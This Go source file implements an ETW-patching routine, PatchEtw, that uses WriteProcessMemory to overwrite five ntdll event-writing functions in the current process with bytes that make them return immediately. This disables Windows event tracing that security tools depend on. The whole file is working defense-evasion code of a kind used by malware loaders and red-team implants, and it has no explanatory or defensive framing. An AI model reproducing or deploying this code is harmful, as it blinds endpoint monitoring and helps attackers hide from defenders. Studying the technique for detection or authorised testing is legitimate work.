package core

import (
  //"fmt"
  "unsafe"
  "syscall"
  "encoding/hex"
)

var (
  ntdll                     = syscall.NewLazyDLL("ntdll.dll")

  procWriteProcessMemory    = syscall.NewLazyDLL("kernel32.dll").NewProc("WriteProcessMemory")

  procEtwEventWrite         = ntdll.NewProc("EtwEventWrite")
  procEtwEventWriteEx       = ntdll.NewProc("EtwEventWriteEx")
  procEtwEventWriteFull     = ntdll.NewProc("EtwEventWriteFull")
  procEtwEventWriteString   = ntdll.NewProc("EtwEventWriteString")
  procEtwEventWriteTransfer = ntdll.NewProc("EtwEventWriteTransfer")
)

func PatchEtw() (error) {
  handle := uintptr(0xffffffffffffffff)

  dataAddr := []uintptr{ 
    procEtwEventWriteFull.Addr(), 
    procEtwEventWrite.Addr(),
    procEtwEventWriteEx.Addr(),
    //procEtwEventWriteNoRegistration.Addr(),
    procEtwEventWriteString.Addr(),
    procEtwEventWriteTransfer.Addr(),
  }

  for i, _ := range dataAddr {

    data, _ := hex.DecodeString("4833C0C3")
    var nLength uintptr
    datalength := len(data)

    WriteProcessMemory(
      handle,
      dataAddr[i],
      &data[0],
      uintptr(uint32(datalength)),
      &nLength,
    )

  }

  return nil
}

func WriteProcessMemory(hProcess uintptr, lpBaseAddress uintptr, lpBuffer *byte, nSize uintptr, lpNumberOfBytesWritten *uintptr) (error) {

  r1, _, e1 := syscall.Syscall6(
    procWriteProcessMemory.Addr(),
    5,
    uintptr(hProcess),
    uintptr(lpBaseAddress),
    uintptr(unsafe.Pointer(lpBuffer)),
    uintptr(nSize),
    uintptr(unsafe.Pointer(lpNumberOfBytesWritten)),
    0,
  )

  if r1 == 0 {
    if e1 == 0 {
      return e1
    }
  }
  
  return nil
}


